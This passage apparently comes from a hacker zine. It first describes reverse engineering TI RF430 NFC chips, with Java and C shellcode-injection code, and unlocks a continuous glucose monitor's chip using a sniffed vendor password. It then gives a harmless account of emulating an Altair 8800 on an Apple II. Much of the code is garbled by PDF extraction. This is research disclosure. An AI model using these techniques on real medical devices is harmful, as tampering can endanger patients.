; c a l l i n g t h i s o v e r NfcV , you must send a
; password b y t e o f 0 x95 b e f o r e t h e v a l u e you
; intend to write .
See page 57 o f SLAU603B .
rom_writesysctrlreg :
5 d2c
CMP. B
#0x95 ,&RF13MRXF
; I s 0 x95 r e a d from t h e RF13 modem?
5 d32
JNE
earlyret
5 d34
MOV. B
&RF13MRXF, R12
5 d38
CALL
#r o m _ w r i t e s y s c t r l r e g
earlyret :
5 d3c
RET
−− Reads b l o c k 0 0 .
−− S u c c e s s , 4 b y t e s o f data .
−− Reads b l o c k 0000
−− S u c c e s s , same 4 b y t e s .
6 git
clone https://github.com/travisgoodspeed/goodtag
issue 86 on the Mspdebug github page if using that fine software. Uniflash is ugly and bloated, but it works with this
chip out of the box.
7 See
89Soon enough we had a nice little understand-
ing of how the ROM worked, and anything that was
missing could easily be looked up. As we’ll soon see,
that was handy both for making our own firmware
smaller and for injecting shellcode into SRAM to
quickly perform complicated functions.
This was a better target than the call stack be-
cause it was a fixed target, and we could modify the
pointer long before calling it. In the end, we chose
the rom_rf13_senderror() function sends an error
in response to an illegal block address. The Java
code on page 11 calls a function at a given address
by overwriting that pointer, triggering the error, and
then restoring the original handler. It returns the
NFC message returned by the error, which might be
quite a few bytes.
Having the Java to run the shellcode is well and
good, but we also need the shellcode itself. Rather
than hand write it in assembly, we simply targeted
the GNU linker to SRAM and also gave it a small
region for parameters.
Injecting Temporary Shellcode
So now that we understand the ROM, and we know
that the C1 command can write to SRAM, we can
have GoodV inject shellcode into the tag and exe-
cute it! Remote code execution is the name of the
game.
From our memory dumps, it was clear that most
of the little SRAM in use was used for a single table
of function pointers, which is loaded from a mas-
ter copy in ROM and then altered by patches which
are loaded from FRAM. While in other cases we’ll
change that table permanently through modifying
FRAM, for now we’d just like to be able to tem-
porarily change it to run our shellcode once, with
no permanent changes to the tag.
1 /∗ Parameters a r e l o a d e d t o 1E02 by t h e
l i n k e r . We t a k e t h r e e 16− b i t words as
3
l i t t l e endian t h e r e f o r d e s t i n a t i o n ,
s o u r c e , and l e n g t h .
5 ∗/
__attribute__ ( ( s e c t i o n ( " . params " ) ) )
7 u i n t 1 6 _ t params [ 3 ] ;
9 /∗ This l i t t l e b i t o f s h e l l c o d e c a l l s
memcpy ( ) w i t h t h e g i v e n parameters ,
11
r e t u r n i n g 0 on s u c c e s s , 1 on f a i l u r e .
∗/
13 void __attribute__ ( ( n o i n l i n e ) )
shellcode_main ( ) {
15
// Return two b y t e s f o r c o n t i n u a t i o n .
RF13MTXF= memcmp( ( void ∗ ) params [ 0 ] ,
17
( void ∗ ) params [ 1 ] , params [ 2 ] ) ;
return ;
19 }
This shellcode can then be expressed in a mod-
ified form of the TI-TXT file format, where the x
keyword executes from the current working address.
Simply change the six bytes at 0x1E02 to contain
your destination, source, and length.
@1E02
00 00
@1E12
3C 40
2A 1E
4C 43
0A 5B
30 41
@1E12
x
q
10
00 00 00 00
02
82
30
5A
1E
4C
40
4A
1E
08
50
FF
4C
08
1E
FF
04
30
0F
0F
00
41
4C
9A
1D
0A
0F
F1
4C
12
5B
27
02
4B
6F
0C
00
43
4F
4F
2C
0E
1B
0C
4C
9B
53
8A
B0
03
0A
3A
12
20
4D
41public byte [ ] e x e c ( i n t adr ) throws IOException {
/∗ While we c o u l d o v e r w r i t e t h e c a l l s t a c k , i t i s much e a s i e r t o o v e r w r i t e t h e
f u n c t i o n c a l l t a b l e i n e a r l y SRAM w i t h a p o i n t e r t o our f u n c t i o n , b e c a u s e we
4
can o n l y perform w r i t e s o f 4 or 8 b y t e s a t a time , and t h e c a l l s t a c k w i t h i n a
w r i t e h a n d l e r w i l l be q u i t e d i f f e r e n t from t h e one i n a r e a d h a n d l e r .
6
There a r e p l e n t y o f f u n c t i o n s t o c h o o s e from , and an i d e a l hook would be one t h a t
8
won ’ t be mi ss e d by normal f u n c t i o n s . We ’ d a l s o p r e f e r t o have c o n t i n u a t i o n w h e r e v e r
p o s s i b l e , so t h a t e x e c u t i n g t h e code doesn ’ t c r a s h our t a r g e t .
10
The f u n c t i o n p o i n t e r we ’ l l o v e r w r i t e i s a t 0x1C5C , p o i n t i n g t o rom_rf13_senderror ( )
12
a t 0x4FF6 . For p r o p e r c o n t i n u a t i o n , you can j u s t w r i t e two b y t e s t o RF13MTXF and
r e t u r n . Without p r o p e r c o n t i n u a t i o n , an IOException w i l l be thrown i n t h e r e p l y
14
t i m e o u t . To unhook , w r i t e 0x4FF6 t o 0x1C5C , r e s t o r i n g t h e o r i g i n a l h a n d l e r .
2
16
As a handy s i d e e f f e c t , we r e t u r n t h e two b y t e s t h a t need t o be t r a n s m i t t e d f o r
c o n t i n u a t i o n , so you can g e t a b i t o f d a t a b a c k from your s h e l l c o d e .
18 ∗/
20 Log . v ( "GoodV" , S t r i n g . f o r m a t ( " Asked t o c a l l s h e l l c o d e a t %04x" , adr ) ) ;
22 // F i r s t we r e p l a c e t h e r e a d e r r o r r e p l y h a n d l e r .
w r i t e ( 0 x1C5C , new byte [ ] { ( byte ) ( adr & 0xFF ) , ( byte ) ( adr >> 8 ) } ) ;
24
// Then we r e a d from an i l l e g a l a d d r e s s t o t r i g g e r an e r r o r ,
// r e t u r n i n g t h e two b y t e s o f i t s h a n d l e r .
byte [ ] s h e l l c o d e r e t u r n = t r a n s c e i v e (new byte [ ] {
0 x02 ,
// F l a g s
( byte ) 0xC0 ,
// MFG Raw Read Command
0 x07 ,
// MFG Code
( byte ) ( 0 xbe ) , ( byte ) ( 0 xba ) //16− b i t b l o c k number , l i t t l e endian .
}) ;
Log . v ( "GoodV" , " S h e l l c o d e r e t u r n e d : " + GoodVUtil . byteArrayToHex ( s h e l l c o d e r e t u r n ) ) ;
26
28
30
32
34
//And f i n a l l y , we r e p a i r t h e o r i g i n a l h a n d l e r a d d r e s s , l i k e n o t h i n g e v e r happened .
w r i t e ( 0 x1C5C , new byte [ ] { ( byte ) ( 0 x f 6 ) , ( byte ) ( 0 x 4 f ) } ) ;
36
38
return s h e l l c o d e r e t u r n ;
}
Java Function to Execute RF430 Shellcode from Android
11We also see that A1 and A3 are in FRAM, where we
can read at least part of their code.
RF430TAL152H
We’ll get back to programming the RF430FRL152H
in a bit, but now that we can reverse engineer, pro-
gram, and exploit that chip, let’s take a look at its
commercial variant, the RF430TAL152H.
The TAL152 is very similar in layout and ap-
pearance to the FRl152, with the principle differ-
ence being the contents of mask ROM and the JTAG
configuration. It can be found in a popular brand of
continuous glucose monitor, 8 and there is preciously
little to be found about the chip online, with no pub-
lic datasheet and all conversation shut down in TI’s
E2E forums.
In this section, we’ll trace the long road from first
examining this chip to finally dumping its ROM and
then writing custom firmware to FRAM.
1 ffac
ffae
3 ffb0
ffb2
5 ffb4
ffb6
7 ffb8
ffba
9 ffbc
ffbe
11 f f c 0
ffc2
13 f f c 4
ffc6
15 f f c 8
ffca
17 f f c c
ffce
ab
4a
e2
3c
e1
ae
ab
2c
a4
ca
a3
56
a2
ba
a1
24
a0
ab
ab
fb
00
fa
00
fb
ab
5a
00
fb
00
5a
00
f9
00
57
00
ab
dw
addr
dw
addr
dw
addr
dw
addr
dw
addr
dw
addr
dw
addr
dw
addr
undefined2
dw
ABABh
fram_e2
E2h
fram_e1
E1h
fram_e0
ABABh
rom_a4
A4h
fram_a3
A3h
rom_a2
A2h
fram_a1
A1h
rom_a0
00A0h
ABABh
The table ends early, of course, with E0, E1, and
E2 being disabled by E0’s command number having
been overwritten by the table end marker. These
commands were available at some point in the man-
ufacturing process, and we can read their command
handlers from FRAM, but we cannot execute them.
Calling these functions is a bit disappointing. A1
returns the device status of some sort, but the other
Ax commands don’t even grace us with an error mes-
sage in reply. The reason for this is hard to see from
the partial assembly, but we later learned that they
require a safety password.
So not yet being able to run A3, we read its dis-
assembly. The function begins by calling another
function at 0x1C20 and then proceeds to read a
raw address and length before sending the requested
number of 16-bit words out the RF13 modem to the
reader. If we could just call this command, we could
dump the ROM and reverse engineer the behavior
of the other commands!
Reading, but not Writing, to FRAM
When first experimenting with the chip, we find that
there is one extra block of FRAM exposed by NFC,
and that there is no secret page of the configuration
at page FF. Every last page is write protected, and
we cannot change any of them with the standard
write command, 21.
But all is not lost! There is a table of func-
tion pointers on the final page, and the value of the
RESET vector tells us that this ROM is different from
the FRL152, so we know that the two devices have
different software in their ROMs.
We also see this table, which begins at 0xFFCE
with the magic word 0xABAB and then grows down-
ward to the same word at a lower address, 0xFFB8. 9
Each entry in this table is a custom vendor com-
mand, and we see that much like the C0 and C1
commands that have been so handy on the FRL152,
the TAL152 has commands A0, A1, A2, A3, and A4.
Sniffing the Readers
To get the password, we had to sniff a legitimate
reader’s attempts to call any Ax command other
than A1, so that we could learn the password and
us A3 to dump raw memory. We found this both
by tapping the SPI bus of the manufacturer’s dedi-
cated hardware reader and separately by observing
the vendor’s Android app in Frida.
8 See our lecture, The Inner Guts of a Connected Glucose Sensor for Diabetes at Black Alps 2019 for details of the sensor
in a medical context.
9 The location and format are the same as the FRL152, except that the magic word is ABAB instead of CECE.
12were unsuccessful, but by summer I hope to mill a
metal case for the RF430 then back a chip in a reg-
ulated kiln for many hours to look for bit failures.
Custom firmware might also allow visibility into the
error correcting bits of the FRAM, to better recog-
nize partial success at introducing errors.
There are also some test pins on the chip which
aroused our curiosity, as other chips use them to en-
ter a bootloader and these chips might use them to
reset to a factory state. This could be as effective
as overheating the FRAM, without the hassles of
extreme temperatures.
–——–
———
—–—–
It’s also worth noting that our successful
method–using the A3 command with the manufac-
turer’s password–could be accomplished either by
tapping the hardware reader’s SPI bus or by reading
that same password out of the manufacturer’s An-
droid application. In reverse engineering, any tech-
nique that works is a good one, and there’s often
more than one way to win the game.
The 32-bit password came as a parameter to the
A0 command, which initializes the glucose sensor af-
ter injection into a patient’s arm. Trying this same
password in A3, followed by an address and length,
gave us the ability to read raw memory. Looping
this gave complete dumps of ROM and SRAM, as
well as a complete dump of the FRAM regions which
are not exposed by the standard read command, 20.
Inside the ROM
Loading this complete dump into GHIDRA shows
that the ROM is related to that of the FRL152H, but
that they have diverged quite a bit. The TAL152
implements no vendor commands directly; rather,
they must be added through the patch table. It has
no secret pages.
Lacking the ability to write directly to pages,
and finding no new commands, we explored the re-
maining commands. Sure enough, A2 write protects
every FRAM page that is exposed by NFC, and A4
unlocks almost all of those same pages!
Unlocking and Patching
Calling the A4 command, we can then unlock pages
and begin mucking around. A simple write to
0xFFB8 will re-enable the Ex commands, allowing
us to experiment with restoring old sensors. Or we
can compile our own firmware to run inside of the
TAL152, turning a glucose sensor into some other
device.
Some Other Unlocking Techniques
While trying to dump the TAL152, we hit a few dead
ends that might possible work for you on other tar-
gets.
First, the JTAG of the TAL152 appears to be
unlocked if it follows the same convention as the
FRL152. This might very well be caused by a cus-
tom activation key, 10 but whether it is a different
locking mechanism or a different key, we were un-
able to get a connection.
We also tried to wipe these chips back to a
factory setting by raising them above their Curie
point, which Texas Instruments Application Report
SLAA526A, MSP430 FRAM Quality and Reliabil-
ity, leads us to believe is near 430 ◦ C. Short exper-
iments involving a hot air gun and strong magnets
10 See issue 86 on the Mspdebug project for details on the activation key.
https://github.com/dlbeer/mspdebug/issues/86
1320:04
Turtles All the Way Down
by Charles Mangin
Emulating an Apple II is a relatively straight-
forward proposition.
The architecture is well-
documented; the chips and logic are all well under-
stood. It’s a solved problem. All that remains is the
choice of implementation.
The Apple II family of computers has been virtu-
alized many times over, recreated in forms as varied
as Javascript and Minecraft redstone logic. You can
even tinker with Print Shop on your smartphone or
play Wavy Navy in a web browser.
The program emulating the Apple may even be
running inside a virtual machine of its own - a Paral-
lels VM running Windows running AppleWin, itself
hosted on a Mac running macOS, all to play an Ap-
ple II game. How far you can go along this chain
is only limited by your imagination and available
hardware. That whole macOS installation may be
running in VirtualBox on a Linux host.
But can we go deeper?
Turns out, yes. Yes we can. In this PoC, I set
out to add another layer or two to the this emulation
lasagna by emulating an Altair 8800 on the Apple
II.
The original S-100 machine, the Altair, boasts
toggle switches, blinking LEDs, and not much more
beyond that. Inside its industrial steel chassis lurks
an Intel 8080 processor churning through bytecode
at two MHz. With an addressable space of 64 kilo-
bytes of memory, the 8080 contains seven eight-bit
registers, a relocatable stack, and can access up to
256 I/O devices.
That seems easy enough to emulate on modern
hardware, right? Compare those stats to the 6502
in the Apple II, however. The 6502 is also an eight-
bit processor with 64k addressable memory, only
three registers, a fixed 256-byte stack at 0x0100 and
memory-mapped I/O.
Luckily, much of the hard work was done for me
in 1979, by Dann McCreary. He created an 8080
interpreter program for the KIM-1, a single-board
6502 computer with even fewer blinking lights and
switches than the Altair. I found the binaries and
source for SIM-80 in the usual way, through Google
and the Internet Archive.
I set about cleaning up McCreary’s 40 year old
KIM-1 source code, ready to turn it to my will and
port it to the Apple II. Once again, Dann had done
the hard work for me. Apple-80 was a commercial
release of SIM-80 for the Apple II, and I found a rip
of the cassette, along with documentation, but no
source, at brutaldeluxe.fr.
With the KIM-1 SIM-80 source on one hand,
and a freshly disassembled binary of Apple-80 on
the other, I was able to reproduce the source for
Apple-80. My efforts then shifted to updating and
augmenting it, relocating the code to run at boot
from a ProDOS floppy instead of loading from cas-
sette.
14Apple-80 emulates the 8080 processor opcode-
by-opcode, and provides a window into the inner
workings of the processor as it operates, allowing a
user to step and trace assembly code, modify regis-
ter state directly, and read and write memory - but
that’s it. A single status line. I wanted more of the
Altair experience. I wanted Blinkenlights.
The Apple II has a mixed low-resolution graph-
ics and text mode, with 40 horizontal by 40 vertical
rectangular pixels in 16 stunning colors, and four
lines of 40-column text below. I designed a low-res
screen version of the front plate of the Altair 8800
and scootched the Apple-80 status line into the “plus
four” text lines.
Opcode Origami
Both the Apple II and virtual Altair were accessing
the same 64K of memory space, with the Apple set-
ting aside 4K of that for the Altair to play in - the
range from 0x1000 to 0x1FFF. Below that range lives
the Apple’s own zero page variables in use by ROM
routines, the 6502’s immobile stack, and the display
buffer for text and low resolution screens. Above, at
0x2000, sits the emulator program itself, an address
set by ProDOS for any program that runs at boot.
The problem, at this point, was not that the Al-
tair was limited to four virtual kilobytes, but that
they started above 0x00. The programs I entered all
had to be rewritten, relocated to run at the higher
address range, which limited me to very simple pro-
grams.
Additionally, any time the virtual 8080 stepped
outside of its strict memory bounds, unpredictable
crashes happened. If the 8080 program modified
a portion of the emulator program by mistake, or
ventured into ROM space and triggered one of the
Apple’s soft switches, all was lost.
Thus began a deep dive into the emulator core -
all my changes up to this point had been to relocate
routines or add my display functions on top of the
existing pieces. Now I was going to have to rewrite
portions of Dann McCreary’s code to dynamically
relocate everything by 0x1000 bytes. This way, an
8080 program designed to run at 0x00 could live in
a real chunk of memory at 0x1000 and not interfere
with the 6502 zero page.
Each operation of the 8080, and thus the SIM-
80 emulator, essentially does one of three things: 1)
read a chunk of memory into a register or register
pair (RP), 2) write the contents of an RP to memory,
It was then a matter of animating the graphi-
cal front end of the newly dubbed Sim-8800. 11 The
lights on the front of a real Altair reflect the sta-
tus of the memory and address lines of the 8080, as
well as other processor status bits. The switches are
used to change and step through bytes of memory. I
added hooks into the step and trace functions of the
emulator core to change the proper pixels on the low
res screen in order to simulate LEDs turning on and
off, and toggling switches in up or down positions.
Keyboard commands were then added to flip these
virtual switches and change the bits in the emulated
processor to the appropriate status.
I could now enter a program into the Sim-8800
the same way a hobbyist who had finally finished
soldering together his Altair kit in late 1970s would
have.
Byte by byte, flipping switches, and noting the
pattern of LEDs, a test program is entered and then
run. What better program to test with than the
classic “Kill the Bit,” which causes the processor to
access memory at specific addresses, triggering lights
on the front panel to rotate in a pattern.
This program and a more complex Pong-like
game worked a treat. I had emulated the Altair
out-of-the-box experience on an Apple II - almost.
11 unzip
pocorgtfo20.pdf SIM8800.zip
15;
;
;
;
;
;
;
;
;
;
;
;
;
;
;
;
0000
0000
0003
0005
0008
0009
000A
000B
000C
000D
0010
0012
0013
0014
0015
0018
o r g 0000
21 00 00
16 80
01 0E 00
1A
1A
1A
1A
09
D2 08 00
DB FF
AA
0F
57
C3 08 00
end
lxi h,0
mvi d , 0 8 0 h
l x i b , 0 eh
beg : l d a x d
ldax d
ldax d
ldax d
dad b
j n c beg
in 0 ffh
xra d
rrc
mov d , a
jmp beg
; i n i t i a l i z e counter
; s e t up i n i t i a l d i s p l a y b i t
; higher value = f a s t e r
; d i s p l a y b i t p a t t e r n on
; . . . upper 8 a d d r e s s l i g h t s
; increment di sp la y counter
; i n p u t data from s e n s e s w i t c h e s
; e x c l u s i v e o r with A
; r o t a t e d i s p l a y r i g h t one b i t
; move data t o d i s p l a y r e g
; repeat sequence
Kill the Bit source, published by Dean McDaniel in 1975.
16received from the virtual SIO are simply printed to
the screen through the “character output” or COUT
function call. This handles everything from scrolling
the text window, to wrapping text at 40 (or later,
80) characters, to linefeeds and carriage returns.
Reading the keyboard buffer at 0xC000 provides in-
put to the SIO, one byte at a time.
I added a code to the emulation routines han-
dling the OUT and IN 8080 opcodes to make them
call my virtual SIO subroutines. These subroutines
in turn set the proper status bits, indicating that
the card is either ready to receive or ready to send.
As far as the virtual Altair is concerned, it’s con-
nected to a ridiculously fast serial board that never
has to wait for a byte to buffer, and it’s always in
sync with the receiving printer.
or 3) carry out some manipulation of bytes within
the registers. There are a handful of other unique
opcodes that have different effects, but the bulk of
the opcodes fit into one of those three categories.
Any routine instructing the emulator to read
from memory or write to memory (including the pro-
gram counter [PC] that keeps up with the current
instruction address) had to be modified. I added
0x1000 to the PC for reads, then subtracted 0x1000
for execution. Writes were handled similarly, adding
0x1000 in order to write the correct real addresses.
As each edge case was found, the off-by-one er-
rors began to fall, and soon I could run rudimentary
programs again - this time, as they were originally
written. There was one binary beastie I wanted
to tackle in particular, but it would require having
some means of doing input and output. The next
goal was something slightly more complicated than
turning LEDs on and off.
Ya BASIC
Microsoft, at the time styled Micro-Soft, was formed
in order to sell a BASIC interpreter to MITS after
the Altair was revealed. Their initial product ran
in 4K (check) and needed only a serial connected
teletype for I/O (check). 12
The program itself is much too large to enter by
hand. While I could transfer the bytes in one at a
time through the virtual paper tape machine I had
created with the emulated SIO, I took a shortcut in-
stead. I cheated and had ProDOS load BASIC into
the virtual Altair’s memory directly. When Sim-
8800 booted up, BASIC was already sitting at 0x00,
ready to run.
And run it did. The first time the prompt spat
out the bottom of the Apple II screen, asking me
how much memory the system had, I grinned like a
fool.
Talk To Me
The first peripheral most Altair owners would add
to their machines was some sort of input and out-
put beyond the built-in LEDs and switches. A paper
tape reader and teletype printer opened up a world
of possibilities beyond Kill the Bit, and turned the
hobbyist curiosity into a truly useful home computer
- for those homes that could accommodate a clang-
ing, clacking teletype. These were connected to the
Altair with a serial board, the 88-SIO or later 88-
2SIO.
Once again diving into the Internet Archive, I
surfaced with complete documentation of the 88-
SIO board, including full assembly and installation
instructions as well as theory of operation. Most
importantly, a table of the status bits was included,
and assembly listings of programs for testing the
board. Bonus!
The internal workings of the SIO are not impor-
tant, or indeed that complicated. In order to take
in bytes from the outside world, or emit them back
out again, the SIO utilizes two of the 8080’s I/O
ports. One is used for status, both setting and read-
ing, the other for transmitting and receiving bytes.
Being the first such device available for the Altair,
those functions default to ports 0x00 and 0x01 re-
spectively.
Emulating the external teletype functions, I used
the Apple II’s built-in ROM functions. Any bytes
12 http://altairbasic.org/
1718I could now create and run a program in an in-
terpreted language created by a program running on
a virtual 8080 processor, emulated by another pro-
gram running on a 6502 processor.
Then the text scrolled past the four lines at the
bottom of the mixed low res graphics screen, and I
coded up a full-screen switch.
Then the default line length turned out longer
than the 40 columns of the Apple II standard text
mode, and I knocked together a switch to set 80
column text mode.
But can we go deeper?
With 4K of virtual memory, and the optional
trigonometric and random functions turned on, BA-
SIC was left with a meager 726 bytes of memory to
run programs. This was a significant roadblock to
many ambitious Altair owners in their day as well,
and was cause for many memory upgrades.
Remediating this limitation in my emulated Al-
tair meant moving my program from 0x2000 to a
spot higher in memory. This entailed writing a small
program that would load at boot time into 0x2000,
then load Sim-8800 from disk into a higher memory
location and hand off control. The loader, its job
complete, would get clobbered by the next phase,
which loaded a more complex, 8K BASIC into mem-
ory.
But why stop there? The Apple II has 64K of
memory space, albeit in a rather hodgepodge ar-
rangement.
As outlined by Gary B. Little in Inside the Ap-
ple IIe, reproduced on page 20, the first roughly
4K of RAM is associated with zero page variables,
stack, and text/graphics buffers. On the higher end
is the ROM, the 4K at 0xC000 for memory-mapped
I/O and peripheral cards, and everything else above
0xBF00 is used by ProDOS. All this leaves about
36K of usable space on a standard 64K Apple II
system. If I could keep my program, including the
graphics for the virtual Altair front panel, at less
than 4K, I could emulate a 32K 8080 system on a
64K 6502.
And so I did. All my code and data lived at
0x9000 through 0xBF00, with plenty of room to
spare, while Sim-8800 addresses everything from
0x1000 through 0x8FFF, and pretends it’s 0x0000
to 0x07FFF.
32K felt luxurious compared to the 4K I had pre-
viously eeked out a working program in, so I was
happy with it for a while. I found a chess program
built for the 8080, and played a few moves against it.
I even worked out a way to load text files from floppy
disk into the emulated paper tape reader, meaning
I no longer needed to type in ever more complicated
BASIC programs.
And if I ever wanted to save one of those pro-
grams back out from the emulator, I could. Well.
Um. Paper tape? Oh.
Back Off - I’m A Scientist
The next obvious peripheral most Altair owners
would have sprung for in those early days of home
computing was a floppy drive. At 8” across, these
disks were truly floppy, contrasted to the compara-
bly compact 5.25” “mini” floppy disks that would
come later.
The 88-DCDD (sensing a naming convention
here?) was the 8” floppy drive of choice for those
early machines, and came, like the 88-SIO, with
a complete set of assembly instructions and tables
of I/O bytes. Credit, once again, to the Internet
Archive for the documentation.
8” Altair disks are preserved for the ages in
archived DSK files. Thankfully for me, the DSK for-
mat is a byte-for-byte image of what one would find
on the disk itself, contiguous and without preamble.
The physical format allows for 77 tracks of 32 hard-
defined sectors, each with 137 bytes of data - 128
bytes with a small lead-in and out, plus space for a
checksum - for a total of 330K of data per DSK.
The Apple II generally boots from 140K 5.25”
floppies - you may sense a problem here.
Luckily, my choice of ProDOS for booting the
Apple II allowed me to leverage its ability to boot
from hard drive volumes up to 32 MB. Today, those
volumes generally live on some sort of solid state
storage device, like a CFFA-3000. In fact, I hadn’t
touched a real floppy disk in this whole process - all
of my disk storage for the Apple II was emulated
by either a CFFA or a Floppy Emu, both of which
present solid state storage media (Compact Flash
or SD card) to the Apple as if it is a floppy disk or
spinning drive.
The storage issue resolved, I could focus on the
actual emulation. Having tackled the SIO emula-
tion, the DCDD was a relative breeze - that is, if a
scorching hurricane of sand and broken glass could
be called a “breeze.”
19Apple IIe Memory Maps.
Reprinted from Inside the Apple IIe by Gary B. Little.
20My decision to tie every IN and OUT opcode to
the SIO emulation came back to bite me here, and
I was forced to rip out vital chunks of code in order
to rebuild them in a new, better abstracted image.
Now, in addition to an infinitely fast serial port, the
Altair was connected to a floppy drive with near-zero
seek time spinning at roughly 3.75 million RPM.
The only easy part of the disk emulation comes
thanks to the hard sectoring of the disks. While the
actual data on disk is interleaved to give the com-
puter time to process data from sector N before being
presented with the data on sector N+1, the hardware
treats the sectors as numbered sequentially. Inter-
leaving is handled by the software, so I didn’t need
to build an interleave table. It’s also up to the pro-
gram reading the data on disk to build and decode
any checksums on the data, tasking the drive only
with reliably reading and writing bytes.
To present the Sim-8800 with bytes from a vir-
tual disk, I needed to load in data from the DSK file
on a real disk (in the way that an SD card emulating
a spinning drive is a “real” disk). To do this, Pro-
DOS can read arbitrary pieces of a file, given a start-
ing byte offset and a length. To properly emulate a
spinning disk, I load in one full 4,384 (32 x 137) byte
track at a time into memory. This is queued 1K at
a time by ProDOS into a buffer before being moved
into place. If you can tell I’m running out of bytes
to shove things into, you’re still not wrong.
When the Altair starts asking for data, there’s
no way to tell what track it’s looking for, or what
sector. The virtual DCDD simply increments the
track number and grabs 4.3K from the DSK, over-
writing the previous track’s data, when Sim8800
tells it to step the motor inward by a track. Then,
when Sim8800 reads the status byte for the drive,
the DCDD increments the sector by one. This way,
the program loading data only needs to wait a few
virtual CPU cycles for the proper sector to come by.
And then, there’s the bootstrapping problem.
Whereas the Altair knew what to do when told to
run BASIC, that was because I was loading BASIC
into virtual memory before the Altair booted. With
a program on disk, I was no longer able to cheat to
get by. I needed a bootloader. Luckily, the internet
provided again. The same site I kept coming back to
for DSK files and other information not easily found
on archive.org had a variety of boot ROMs for the
Altair - deramp.com.
I acquired a proper bootloader, which was now
loaded into memory at boot time, much like a ROM
21Catch All That?
board used a real Altair owner. Booting from the
ROM is easy, only requiring the computer to exam-
ine the proper place in memory - a simple incanta-
tion consisting of flipping the front panel switches,
and then telling the machine to run. The loader
relocates itself in memory away from ROM space,
modifying itself as necessary along the way, based
on the front panel switch settings, and finally runs
at its new location.
This pass accesses the disk at track zero, sec-
tor zero, and loads data from disk into memory at
0x00. After reaching the end of track zero, the
loader hands off control to the program at 0x00,
which is then responsible for loading the remainder
of the operating system from the disk.
After some additional effort to get the virtual-
ized DCDD to write data back to a DSK file, I was
able to read, run, and save BASIC programs stored
on a DSK under a Disk BASIC and Altair DOS. I
could now run an interpreted program loaded into
an operating system in 32K of virtual memory on an
emulated 2 MHz 8080 from an emulated 8” floppy
disk which was really a file inside another file on
an SD card emulating a spinning hard drive feeding
data into an Apple II with 64K of RAM and a 1MHz
6502.
But, again, can we go deeper? The answer is yes,
but first, a bit of a diversion:
“If you wish to make an apple pie from scratch,
you must first invent the universe.” - Dr. Carl
Sagan, 1980
To paraphrase Dr. Sagan, in order to play a com-
puter game, you must first invent the computer.
To this end, in 1979 the authors of what would
eventually become the Infocom interactive fiction ti-
tle Zork, manifested from pure imagination and no
small amount of magic a virtual computer to run it
on. They called it the “Z-Machine.”
Much has been written about this virtual ma-
chine, its antecedents and its successors. Several
versions of the Z-Machine were created, and even
today there is a vibrant community of authors and
creators who still program for it. The fabled ma-
chine does not exist in a physical form of chips and
wires, but only in the imagination.
Imagine a computer - depending on the accuracy
and veracity of your imagination, you may come up
with something that contains a processor, memory,
storage, and some forms of input and output. Good
imagining, neighbor!
In order for this imaginary machine to function
in the real world, and run the programs, it must
be implemented in code on an actual computer. Z-
Machine interpreters, or programs that emulate a
virtual Z-Machine, have been written for nearly any
platform you can think of. An atypical, but not
unheard-of system for running Zork in its heyday
might have been an Altair 8800. Now imagine one
of those.
Actually, no need to imagine. I already had a
virtual Altair 8800. Dare I dream? Could it run
Zork?
In a word: No. Not yet.
22Zoom and Enhance
Enter the Apple IIe. While the base system still
faces the typical 64K limitation, a common upgrade
for the IIe is an 80-column card with an additional
64K of “auxiliary” memory on board. 64 glorious
kilobytes of usable RAM, at my fingertips! Why
not just run the emulator itself in main memory,
and shuttle the virtual memory into the aux mem-
ory on the card? Because that would be too simple.
You see, in order to access that auxiliary mem-
ory outside the 64K limit on an eight-bit system, one
must perform bank switching. Chunks of memory
are turned off and others turned on in their place.
This process is handled through soft switches, mem-
ory locations in the ROM area that inform the pro-
cessor how to perform whenever they are accessed.
You can’t have access to both aux and main RAM
at the same time. My code would need to exist in
both places at once in order to continuously main-
tain control.
Add to this the fact that the Apple mirrors por-
tions of the main memory in auxiliary, so that when
banked out, the processor still has access to the pe-
ripheral ROM, zero page and stack, among other
things. The end result is about 32K of usable mem-
ory in the aux space to add to the 32K I was using
in main memory. I had my 64K. Only, like Waffle
House hash browns, it was scattered, smothered and
chunked.
I endeavored once again to dynamically remap
the 8080 virtual memory, retracing the paths I had
forged in my previous efforts. This time, in addition
to shifting all the virtual addresses up 0x1000 real
bytes (to make room for 6502 zero page, etc.) I was
bank switching any virtual address above 0x7FFF
into the auxiliary space. Once there, the address
would need to be shifted down 0x8000 bytes again,
since aux space counts up from zero. Then, every-
thing gets shifted up again another 0x1000 bytes,
since the 6502 zero page is mirrored in aux.
All of these mathematical gymnastics need to
happen any time the virtual 8080 accesses any vir-
tual address, whether it’s the PC fetching an op-
code, reading bytes, or writing bytes in memory.
Keeping this all straight in my head was nigh impos-
sible, and it led to some frustrating, if spectacular
crashes, as virtual programs that used to run per-
fectly well in 32K suddenly overran the emulator’s
bounds.
I loaded in and bootstrapped CP/M 1.4 from a
DSK intended for a 48K system. It worked!
Giving It All I’ve Got
In order to run Zork on an Altair, said Altair must
have some kind of text terminal (check), a floppy
disk to read and write the program files (check) and
be running the CP/M operating system (hmm...).
Digital Research’s CP/M was a contemporary of and
competitor against Micro-Soft’s DOS, and early ver-
sions exist that will barely squeak by with just 24K
of memory.
I should note here that at each point in my jour-
ney, I found and fixed numerous bugs in my code,
and limitations of the original Apple-80 emulator
core. These were flaws were revealed by the ever
expanding and complex convolutions I was forcing
upon it. 8K BASIC uncovered issues with reposi-
tioning the stack pointer; Disk BASIC had trouble
with reading from virtual disk, and Altair DOS with
writing to it. At multiple stops along the way, I was
forced to backtrack - faced with the consequences of
fixing a load-bearing bug, while wondering how this
whole thing had even worked in the first place.
Debugging my own 6502 spaghetti code is one
thing, my head was swimming trying to understand
what the emulated 8080 code was intended to do,
while also handling translation of memory addresses
from virtual to real.
Deramp.com provided a DSK of 24K CP/M, ver-
sion 1.4, which ran like a champ as I put it through
some limited testing. The distribution on the DSK
was intended to be used to make another bootable
disk, rather than used by itself, but it worked as
proof of concept that Sim-8800 could, indeed, run
CP/M.
But 32K just wasn’t going to suffice. In fact,
CP/M 1.4 wouldn’t cut it, either. According to my
research, I was going to need at least 48K minimum,
and CP/M 2.2 for the Z-Machine interpreter.
As I’ve demonstrated, on a typical 64K Apple
II system, there’s no way to load up 48K of any-
thing, let alone leave room for an emulator program
to manage it all. I would have to revise my minimum
system requirements for running Sim-8800.
23With some trepidation, I pointed the emulated
disk drive at a file named ZORK.DSK and booted once
more.
Finally - after revealing yet another edge case,
and guiding me to yet another flaw in my math re-
lated to the virtual stack pointer, which took me
two days to find and fix - it worked.
I was west of a white house. I took the lamp and
the sword. I killed the troll and got lost in the maze
of twisty passages, all alike.
